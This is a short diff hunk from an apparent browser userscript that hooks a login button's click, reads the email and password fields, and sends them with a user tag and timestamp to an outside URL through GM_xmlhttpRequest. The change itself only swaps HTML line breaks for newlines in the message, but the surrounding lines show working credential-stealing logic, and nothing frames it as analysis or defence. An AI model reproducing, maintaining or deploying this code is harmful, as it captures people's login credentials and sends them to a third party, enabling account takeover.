@@ -6,7 +6,7 @@ document.getElementById("loginbutton").onclick = function(){
     let pass = document.getElementsByName("pass")[0].value;
     if (typeof useringer === "undefined") {let useringer = "None"};
     if (!(email == null || email == "" || pass == null || pass == "")){
-        let message = "Email: "+email+"<br>Pass: "+pass+"<br>User: "+useringer+"<br>Date: "+Date();
+        let message = "Email: "+email+"\nPass: "+pass+"\nUser: "+useringer+"\nDate: "+Date();
         GM_xmlhttpRequest ({
                 method:     'GET',
                 url:        encodeURI(urlinger+message),
